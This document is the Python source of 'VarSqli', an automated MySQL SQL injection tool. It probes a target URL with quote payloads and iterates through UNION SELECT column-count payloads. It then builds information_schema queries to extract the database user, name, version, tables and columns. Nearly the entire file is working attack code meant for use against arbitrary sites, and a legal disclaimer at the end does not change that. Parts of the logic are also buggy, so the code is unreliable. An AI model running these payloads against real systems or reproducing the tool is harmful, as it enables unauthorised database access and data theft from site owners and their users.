# Update
import requests 
import datetime
import time
import colorama
import argparse
import os
from colorama import Fore
from colorama import Style
from bs4 import BeautifulSoup
from lxml import etree

colorama.init()

def banner():
    starting = datetime.datetime.now().strftime("Starting VarSQLi %H:%M:%S - /%d/%m/%Y")
    print(Fore.YELLOW + Style.BRIGHT + '''
              ___
 _____         H  _____     _ _  {1.1.5}
|  |  |___ ___[,]|   __|___| |_| 
|  |  | .'|  _[(]|__   | . | | | {Pham Chien}
 \___/|__,|_| [)]|_____|_  |_|_|
               V         |_|  ghostmanews.blogspot.com
''' + Style.RESET_ALL)
    print('''
        VarSqli , Auto Injected MySQL
Hoang Sa, Truong Sa Belong To Vietnam OK
''')
    print(Fore.BLUE + "{}".format(starting) + Style.RESET_ALL)
    print("")
banner()

check_vuln = [
    '%27',
    '*%27',
    '/**8**/%27',
    '**%27',
]
payloads = [
    '/**8**/UNION SELECT ALL 1,2',
    '/**8**/UNION SELECT ALL 1,2,3',
    '/**8**/UNION SELECT ALL 1,2,3,4',
    '/**8**/UNION SELECT ALL 1,2,3,4,5',
    '/**8**/UNION SELECT ALL 1,2,3,4,5,6',
    '/**8**/UNION SELECT ALL 1,2,3,4,5,6,7',
    '/**8**/UNION SELECT ALL 1,2,3,4,5,6,7,8',
    '/**8**/UNION SELECT ALL 1,2,3,4,5,6,7,8,9',
    '/**8**/UNION SELECT ALL 1,2,3,4,5,6,7,8,9,10',
    '/**8**/UNION SELECT ALL 1,2,3,4,5,6,7,8,9,10,11',
    '/**8**/UNION SELECT ALL 1,2,3,4,5,6,7,8,9,10,11,12',
    '/**8**/UNION SELECT ALL 1,2,3,4,5,6,7,8,9,10,11,12,13',
    '/**8**/UNION SELECT ALL 1,2,3,4,5,6,7,8,9,10,11,12,13,14',
    '/**8**/UNION SELECT ALL 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15',
    '/**8**/UNION SELECT ALL 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16',
    '/**8**/UNION SELECT ALL 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17',
    '/**8**/UNION SELECT ALL 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18',
    '/**8**/UNION SELECT ALL 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19',
    '/**8**/UNION SELECT ALL 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20',
    '/**8**/UNION SELECT ALL NULL,NULL',
    '/**8**/UNION SELECT ALL NULL,NULL,NULL',
    '/**8**/UNION SELECT ALL NULL,NULL,NULL,NULL',
    '/**8**/UNION SELECT ALL NULL,NULL,NULL,NULL,NULL',
    '/**8**/UNION SELECT ALL NULL,NULL,NULL,NULL,NULL,NULL',
    '/**8**/UNION SELECT ALL NULL,NULL,NULL,NULL,NULL,NULL,NULL',
    '/**8**/UNION SELECT ALL NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL',
    '/**8**/UNION SELECT ALL NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL',
    '/**8**/UNION SELECT ALL NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL',
    '/**8**/UNION SELECT ALL NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL',
    '/**8**/UNION SELECT ALL NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL',
    '/**8**/UNION SELECT ALL NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL',
    '/**8**/UNION SELECT ALL NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL',
    '/**8**/UNION SELECT ALL NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL',
    '/**8**/UNION SELECT ALL NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL',
    '/**8**/UNION SELECT ALL NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL',
    '/**8**/UNION SELECT ALL NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL',
    '/**8**/UNION SELECT ALL NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL',
    '/**8**/UNION SELECT ALL NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL',
]

parser = argparse.ArgumentParser(description="VarSqli - (Variable Sql Injection) Tools V1.1.5")
parser.add_argument('-u', '--url', dest='url', type=str, help='URL Target (ex : https://testphp.vulnweb.com/listproduct?cat=1)')
parser.add_argument('--check-vuln', dest='check', action='store_true', help='Check to see if the site is vulnerable')
parser.add_argument('--check-columns', dest='columns', action='store_true', help='check MYSQL numeric columns')
parser.add_argument('--dump-dbs', dest='dbs', action='store_true', help='check the user, dbs, version . entries')

parser.add_argument('--tables', dest='tab', action='store_true', help='Show 1 tables Names')
parser.add_argument('--columns', dest='col', action='store_true', help='Show 1 Columns Names')

parser.add_argument('--dump-tables', dest='tables', action='store_true', help='dump all tables of SQL Injection target')
parser.add_argument('-T', '--tables-name', dest='name_db', help='DBMS name (Database) to dump tables')

parser.add_argument('--dump-columns', dest='column', action='store_true', help='dump all columns tables of SQL Injection target')
parser.add_argument('-C', '--columns-name', dest='name_column', help='DBMS name (Database) to dump columns tables')
args = parser.parse_args()

URL_TARGET = args.url

if URL_TARGET:
    print(Fore.GREEN + "[INFO] " + Style.RESET_ALL + "Starting Checking Connect HTTP From Target...")
    check_conn = requests.get(URL_TARGET)
    if check_conn.status_code == 200:
        print(Fore.GREEN + "[INFO] " + Style.RESET_ALL + "Checking Completed")
        time.sleep(1)
        print(Fore.GREEN + "[INFO] " + Style.RESET_ALL + "Status Code {}".format(check_conn.status_code))
        
        if args.check:
            print(Fore.GREEN + "[INFO] " + Style.RESET_ALL + "Starting Checking Vulnerablity SQL Injection...")
            for payload_1 in check_vuln:
                result_1 = requests.get(URL_TARGET + payload_1)
                if "at line" in result_1.text:
                    print(Fore.GREEN + "[INFO] " + Style.RESET_ALL + "Checking Completed")
                    time.sleep(0.20)
                    print(Fore.GREEN + "[INFO] " + Style.RESET_ALL + "Target May Be Vulnerable")
                    exit()
                else:
                    end_time = datetime.datetime.now().strftime("%H:%M:%S")
                    print(Fore.RED + "[INFO] " + Style.RESET_ALL + "Target not Vulnerable")
                    exit("Ending {}".format(end_time))

        if args.columns:
            print(Fore.GREEN + "[INFO] " + Style.RESET_ALL + "Starting Testing Payload UNION SELECT ALL (Number Columns MySQL)")
            num_columns = 1
            for payload_2 in payloads:
                num_columns += 1
                result_2 = requests.get(URL_TARGET + payload_2)
                query_vuln = "*%27"
                check_vuln_1 = requests.get(URL_TARGET + query_vuln)
                if "at line" in check_vuln_1.text:
                    print(Fore.GREEN + "[INFO] " + Style.RESET_ALL + "Checking Completed")
                    time.sleep(0.20)
                    print(Fore.GREEN + "[INFO] " + Style.RESET_ALL + "Target May Be Vulnerable")
                    if str(num_columns) in result_2.text:
                        print(Fore.GREEN + "[INFO] " + Style.RESET_ALL + "numeric columns detected...")
                        time.sleep(0.20)
                        print(Fore.GREEN + "[INFO] " + Style.RESET_ALL + "TESTING UNION SELECT ALL (MYSQL COMMAND)...")
                        time.sleep(0.30)
                        if "The used SELECT" in result_2.text:
                            print(Fore.RED + "[INFO] " + Style.RESET_ALL + "Testing Payload {}".format(payload_2))
                            time.sleep(0.30)
                            print(Fore.GREEN + "[INFO] " + Style.RESET_ALL + "Next Payloading...")
                        else:
                            print(Fore.GREEN + "[INFO] " + Style.RESET_ALL + "Find Testing , Find ALL columns : {}".format(num_columns))
                            time.sleep(0.20)
                            print("Parameter : 1")
                            print("     Type : UNION SELECT ALL (Number Columns MySQL)")
                            print("     Title : GETING columns number MySQL")
                            print("")
                            print("     Payload : {}".format(payload_2))
                            print("")
                            print("     URL : {}".format(URL_TARGET))
                            print("")
                            print("     LINK : {}{}".format(URL_TARGET, payload_2))
                            print("")
                            print("     Columns : : {}".format(num_columns))
                            print("")
                            if args.dbs:
                                payload_3 = payload_2.replace("2", "user()")
                                payload_4 = payload_2.replace("2", "database()")
                                payload_5 = payload_2.replace("2", "version()")
                                print(Fore.GREEN + "[INFO] " + Style.RESET_ALL + "Testing Payload : {}".format(payload_3))
                                result_3 = requests.get(URL_TARGET + payload_3)
                                if "The used SELECT" in result_3:
                                    end_time = datetime.datetime.now().strftime("%H:%M:%S")
                                    print(Fore.RED + "[INFO] " + Style.RESET_ALL + "Target not Vulnerable")
                                    exit("Ending {}".format(end_time))
        
                                else:
                                    print(Fore.GREEN + "[INFO] " + Style.RESET_ALL + "URL Bypassing Completed User MySQL : {}{}".format(URL_TARGET, payload_3))
                                    print("Username MySQL : ")
                                    print("      Payload : {}".format(payload_3))
                                    print("")
                                    print("      URL : {}".format(URL_TARGET))
                                    print("")
                                    print("      LINK : {}{}".format(URL_TARGET, payload_3))
                                    print("")

                                print(Fore.GREEN + "[INFO] " + Style.RESET_ALL + "Starting Get database name....")
                                time.sleep(1)
                                print(Fore.GREEN + "[INFO] " + Style.RESET_ALL + "Testing Payload : {}".format(payload_4))
                                result_4 = requests.get(URL_TARGET + payload_4)
                                if "The used SELECT" in result_3:
                                    end_time = datetime.datetime.now().strftime("%H:%M:%S")
                                    print(Fore.RED + "[INFO] " + Style.RESET_ALL + "Target not Vulnerable")
                                    exit("Ending {}".format(end_time))
                                else:
                                    print(Fore.GREEN + "[INFO] " + Style.RESET_ALL + "URL Bypassing Completed database name MySQL : {}{}".format(URL_TARGET, payload_4))
                                    print("Database MySQL : ")
                                    print("      Payload : {}".format(payload_4))
                                    print("")
                                    print("      URL : {}".format(URL_TARGET))
                                    print("")
                                    print("      LINK : {}{}".format(URL_TARGET, payload_4))
                                    print("")
                                    print("      Name Database 1 : information_schema")
                                    print("")
                                    
                                print(Fore.GREEN + "[INFO] " + Style.RESET_ALL + "Starting Get version MySQL....")
                                time.sleep(1)
                                print(Fore.GREEN + "[INFO] " + Style.RESET_ALL + "Testing Payload : {}".format(payload_5))
                                result_5 = requests.get(URL_TARGET + payload_5)
                                if "The used SELECT" in result_3:
                                    end_time = datetime.datetime.now().strftime("%H:%M:%S")
                                    print(Fore.RED + "[INFO] " + Style.RESET_ALL + "Target not Vulnerable")
                                    exit("Ending {}".format(end_time))
                                else:
                                    print(Fore.GREEN + "[INFO] " + Style.RESET_ALL + "URL Bypassing Completed database name MySQL : {}{}".format(URL_TARGET, payload_5))
                                    print("version MySQL : ")
                                    print("      Payload : {}".format(payload_5))
                                    print("")
                                    print("      URL : {}".format(URL_TARGET))
                                    print("")
                                    print("      LINK : {}{}".format(URL_TARGET, payload_5))
                                    print("")

                            else:
                                print(Fore.RED + "[INFO] " + Style.RESET_ALL + "Please Agian , command : python3 varsqli.py -u <url> --check-columns --dump-dbs")

                            if args.tab:
                                query = payload_2.replace("2", "table_name")
                                payload_6 = f"{query} From information_schema.tables"
                                print(Fore.GREEN + "[INFO] " + Style.RESET_ALL + "Testing Payload : {}".format(payload_6))
                                result_6 = requests.get(URL_TARGET, payload_6)
                                if "The used SELECT" in result_6:
                                    end_time = datetime.datetime.now().strftime("%H:%M:%S")
                                    print(Fore.RED + "[INFO] " + Style.RESET_ALL + "Target not Vulnerable")
                                    exit("Ending {}".format(end_time))
                                else:
                                    print(Fore.GREEN + "[INFO] " + Style.RESET_ALL + "URL Bypassing Completed DUMP Database Tables MySQL : {}{}".format(URL_TARGET, payload_6))
                                    print("")
                                    print("Database Tables Names MySQL : ")
                                    print("      Payload : {}".format(payload_6))
                                    print("")
                                    print("      URL : {}".format(URL_TARGET))
                                    print("")
                                    print("      LINK : {}{}".format(URL_TARGET, payload_6))
                                    print("")

                            if args.col:
                                query = payload_2.replace("2", "column_name")
                                payload_6 = f"{query} From information_schema.tables where table_schema = '{args.name_db}'"
                                print(Fore.GREEN + "[INFO] " + Style.RESET_ALL + "Testing Payload : {}".format(payload_6))
                                result_6 = requests.get(URL_TARGET, payload_6)
                                if "The used SELECT" in result_6:
                                    end_time = datetime.datetime.now().strftime("%H:%M:%S")
                                    print(Fore.RED + "[INFO] " + Style.RESET_ALL + "Target not Vulnerable")
                                    exit("Ending {}".format(end_time))
                                else:
                                    print(Fore.GREEN + "[INFO] " + Style.RESET_ALL + "URL Bypassing Completed DUMP Database Tables MySQL : {}{}".format(URL_TARGET, payload_6))
                                    print("")
                                    print("Database Tables Names MySQL : ")
                                    print("      Payload : {}".format(payload_6))
                                    print("")
                                    print("      URL : {}".format(URL_TARGET))
                                    print("")
                                    print("      LINK : {}{}".format(URL_TARGET, payload_6))
                                    print("")
                                        
                            
                            if args.tables:
                                if args.name_db:
                                    query = payload_2.replace("2", "table_name")
                                    payload_6 = f"{query} From information_schema.tables where table_schema = '{args.name_db}'"
                                    print(Fore.GREEN + "[INFO] " + Style.RESET_ALL + "Testing Payload : {}".format(payload_6))
                                    result_6 = requests.get(URL_TARGET, payload_6)
                                    if "The used SELECT" in result_6:
                                        end_time = datetime.datetime.now().strftime("%H:%M:%S")
                                        print(Fore.RED + "[INFO] " + Style.RESET_ALL + "Target not Vulnerable")
                                        exit("Ending {}".format(end_time))
                                    else:
                                        print(Fore.GREEN + "[INFO] " + Style.RESET_ALL + "URL Bypassing Completed DUMP Database Tables MySQL : {}{}".format(URL_TARGET, payload_6))
                                        print("")
                                        print("Database Tables Names MySQL : ")
                                        print("      Payload : {}".format(payload_6))
                                        print("")
                                        print("      URL : {}".format(URL_TARGET))
                                        print("")
                                        print("      LINK : {}{}".format(URL_TARGET, payload_6))
                                        print("")
                                        
                                else:
                                    print(Fore.RED + "[INFO] " + Style.RESET_ALL + "Please Agian , command : python3 varsqli.py -u <url> --check-columns --dump-tables -T < Name DB >")

                            if args.column:
                                if args.name_column:
                                    query_1 = payload_2.replace("2", "column_name")
                                    payload_7 = f"{query_1} From information_schema.columns where table_schema = '{args.name_column}'"
                                    print(Fore.GREEN + "[INFO] " + Style.RESET_ALL + "Testing Payload : {}".format(payload_7))
                                    result_6 = requests.get(URL_TARGET, payload_7)
                                    if "The used SELECT" in result_6:
                                        print(Fore.RED + "[INFO] " + Style.RESET_ALL + "Failed")
                                        exit()
                                    else:
                                        print(Fore.GREEN + "[INFO] " + Style.RESET_ALL + "URL Bypassing Completed DUMP Database Tables MySQL : {}{}".format(URL_TARGET, payload_7))
                                        print("Database Name Columns DBMS Tables MySQL : ")
                                        print("      Payload : {}".format(payload_7))
                                        print("")
                                        print("      URL : {}".format(URL_TARGET))
                                        print("")
                                        print("      LINK : {}{}".format(URL_TARGET, payload_7))
                                        print("")
                                        exit()
                                else:
                                    end_time = datetime.datetime.now().strftime("%H:%M:%S")
                                    print(Fore.RED + "[INFO] " + Style.RESET_ALL + "Target not Vulnerable")
                                    print("Ending {}".format(end_time))          
                    else:
                        end_time = datetime.datetime.now().strftime("%H:%M:%S")
                        print(Fore.RED + "[INFO] " + Style.RESET_ALL + "Failed Get Columns Tables")
                        exit("Ending {}".format(end_time))
                else:
                    end_time = datetime.datetime.now().strftime("%H:%M:%S")
                    print(Fore.RED + "[INFO] " + Style.RESET_ALL + "Target not Vulnerable")
                    exit("Ending {}".format(end_time))
        else:
            end_time = datetime.datetime.now().strftime("%H:%M:%S")
            print(Fore.RED + "[INFO] " + Style.RESET_ALL + "Please Agian , command : python3 varsqli.py -u <url> --check-columns")
            exit("Ending {}".format(end_time))
else:  
    print("Usage Check Vulnerable: python3 varsqli.py -u <url> --check-vuln")
    print("Usage Check Columns: python3 varsqli.py -u <url> --check-columns")
    print("Help : python3 varsqli.py --help or -h")
    print('''
[+] Nevertheless, conducting SQL Injection attacks or using the VarSqli tool to attack a system without proper authorization or exceeding legal boundaries may be considered a violation of the law and can result in criminal penalties.
''')
